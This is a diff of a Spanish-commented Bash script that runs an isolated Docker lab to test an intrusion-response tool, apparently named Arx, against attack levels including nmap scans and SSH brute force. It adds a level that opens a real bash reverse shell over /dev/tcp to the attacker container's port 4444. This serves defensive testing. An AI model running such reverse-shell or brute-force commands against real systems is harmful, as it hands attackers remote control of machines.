@@ -1,58 +1,16 @@
 #!/usr/bin/env bash
-# Mini-lab Docker de Arx — DOS contenedores en red aislada:
-#   · víctima  (ubuntu:22.04 privilegiada, sin ufw → ejercita nftables; sshd+rsyslog)
-#   · atacante (ubuntu:22.04 con nmap/sshpass/curl)
-# Niveles: L1 escaneo nmap real · L2 fuerza bruta SSH real · L4/L5/L7/L8/L9 en víctima.
-# Niveles 3 y 10 son destructivos/VM (ver lab/README.md y lab/vm/). Todo es efímero:
-# la red y los contenedores se destruyen al salir.
+# Mini-lab Docker de Arx — DOS contenedores en red aislada (ver lab/lib.sh).
+# Niveles: L1 escaneo nmap real · L2 fuerza bruta SSH real · L6 reverse shell real ·
+# L4/L5/L7/L8/L9 en víctima. Niveles 3 y 10 son destructivos/VM (lab/README.md, lab/vm/).
 set -euo pipefail
 cd "$(dirname "$0")/.."
+source lab/lib.sh
 
-SUF=$$
-NET=arxlab-$SUF
-VIC=arxv-$SUF
-ATT=arxa-$SUF
 FAILED=0
-
-cleanup() {
-  docker rm -f "$VIC" "$ATT" >/dev/null 2>&1 || true
-  docker network rm "$NET" >/dev/null 2>&1 || true
-}
 trap cleanup EXIT
 
 echo "══ red y contenedores ══"
-docker network create "$NET" >/dev/null
-
-docker run -d --name "$VIC" --privileged --network "$NET" --network-alias victim \
-  -v "$PWD":/src:ro ubuntu:22.04 bash -c '
-    export DEBIAN_FRONTEND=noninteractive
-    apt-get update -qq >/dev/null 2>&1
-    apt-get install -y -qq python3 nftables netcat-openbsd procps \
-      openssh-server rsyslog >/dev/null 2>&1
-    ssh-keygen -A >/dev/null 2>&1
-    mkdir -p /run/sshd /work/labcfg /work/labstate
-    echo root:arxlab | chpasswd
-    sed -i "s/^#\?PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config
-    rsyslogd 2>/dev/null || true
-    /usr/sbin/sshd
-    # listeners señuelo 9001-9012: HAN de nacer en el entrypoint (docker exec mata
-    # el árbol de procesos al terminar la sesión — B7). Dan al escaneo algo que tocar:
-    # un SYN-scan contra puertos cerrados no deja socket en /proc/net (límite honesto).
-    for p in $(seq 9001 9012); do nc -k -l $p </dev/null >/dev/null 2>&1 & done
-    sleep infinity' >/dev/null
-
-docker run -d --name "$ATT" --network "$NET" --network-alias attacker \
-  ubuntu:22.04 bash -c '
-    export DEBIAN_FRONTEND=noninteractive
-    apt-get update -qq >/dev/null 2>&1
-    apt-get install -y -qq nmap sshpass curl >/dev/null 2>&1
-    sleep infinity' >/dev/null
-
-echo "esperando a que víctima (sshd) y atacante (nmap) estén listos…"
-docker exec "$VIC" bash -c 'for i in $(seq 90); do pgrep -x sshd >/dev/null 2>&1 && exit 0; sleep 2; done; exit 1'
-docker exec "$ATT" bash -c 'for i in $(seq 90); do command -v nmap >/dev/null 2>&1 && exit 0; sleep 2; done; exit 1'
-
-ATTACKER_IP=$(docker exec "$VIC" python3 -c "import socket; print(socket.gethostbyname('attacker'))")
+lab_up
 echo "atacante: $ATTACKER_IP"
 
 step() { echo; echo "══ $1 ══"; }
@@ -85,8 +43,27 @@ else
   echo "[PASS] contención: la IP del atacante quedó bloqueada (curl agota el tiempo)"
 fi
 
+# L6 necesita que el handshake saliente complete: liberar el bloqueo del L2 (la regla de
+# entrada descartaría la respuesta del atacante si siguiera bloqueado).
+docker exec "$VIC" python3 /src/lab/driver.py release
+
+step "nivel 6: reverse shell clásico — bash -i de la víctima hacia el C2 del atacante"
+# docker exec -d: el shell sobrevive a esta llamada; el `driver` no es su padre.
+docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
+c2_send "touch /tmp/c2-antes"      # debe ejecutarse: prueba que el shell es real
+docker exec "$VIC" python3 /src/lab/driver.py net-revsh "$ATTACKER_IP" || FAILED=1
+c2_send "touch /tmp/c2-despues"    # no debe llegar mientras dure el bloqueo
+docker exec "$VIC" python3 /src/lab/driver.py net-revsh-verify "$ATTACKER_IP" || FAILED=1
+
 step "niveles 4, 5, 7, 8 y 9 en la víctima"
 docker exec "$VIC" python3 /src/lab/driver.py levels || FAILED=1
+
+step "tarpit (Core): con política 'tarpit' se ESTRANGULA la IP en vez de bloquearla"
+# Reutiliza el MISMO escaneo del L1 (sin ataque nuevo) para repoblar la pista scan4;
+# net-tarpit parte de pizarra limpia (el tarpit es un primer contacto) y comprueba que
+# la IP cae en tarpit4 con reglas de rate-limit per-IP, no en block_ipv4.
+docker exec "$ATT" nmap -sS -p 9000-9020 --max-retries 1 victim >/dev/null 2>&1 || true
+docker exec "$VIC" python3 /src/lab/driver.py net-tarpit "$ATTACKER_IP" || FAILED=1
 
 echo
 if [ "$FAILED" = 0 ]; then
